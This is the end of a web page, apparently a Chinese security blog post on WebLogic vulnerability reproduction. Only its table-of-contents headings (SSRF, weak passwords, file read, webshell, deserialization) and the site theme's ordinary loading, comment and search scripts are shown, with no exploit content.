class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-4"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-CVE-2014-4210"><span class="toc-text">ssrf(CVE-2014-4210)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-5"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-1"><span class="toc-text">靶场搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell-2"><span class="toc-text">反弹Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weak-password"><span class="toc-text">weak_password</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-6"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AF%86%E6%96%87"><span class="toc-text">下载密文</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AF%86%E9%92%A5"><span class="toc-text">下载密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-text">解密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0webshell"><span class="toc-text">后台上传webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E8%BF%9E%E6%8E%A5"><span class="toc-text">冰蝎连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-5"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394"><span class="toc-text">Weblogic反序列化漏洞(cve_2021_2394)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-7"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-6"><span class="toc-text">修复建议</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
